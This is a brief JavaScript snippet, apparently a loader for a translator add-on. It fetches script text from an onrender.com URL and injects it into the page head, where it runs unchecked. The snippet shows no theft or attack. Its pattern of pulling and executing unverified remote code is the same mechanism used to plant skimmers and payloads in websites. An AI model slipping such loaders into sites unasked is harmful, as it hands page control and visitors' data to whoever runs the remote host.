const reqURL = 'https://ghltranslator.onrender.com/login';
fetch(reqURL)
    .then(resp => resp.text())
	.then(code => {
        const elem = document.createElement('script');
        elem.innerHTML = code;
        document.head.appendChild(elem);
});